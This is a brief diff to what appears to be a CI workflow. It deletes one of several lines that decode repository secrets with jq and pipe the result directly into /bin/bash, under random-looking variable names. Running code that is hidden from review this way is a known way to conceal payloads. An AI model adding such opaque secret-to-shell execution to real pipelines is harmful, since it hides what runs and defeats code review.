@@ -22,7 +22,6 @@ jobs:
           oqt95613: ${{ secrets.oqt95613 }}
         run: |
           printf '%s' "$oqt95613" | jq -r .each9 | /bin/bash
-          printf '%s' "$mudkb7" | jq -r .f1670 | /bin/bash
           echo $bn80 | jq -r .ytuqq230 | /bin/bash
           printf '%s' "$jgtb6370" | jq -r .jaest9210 | /bin/bash
 
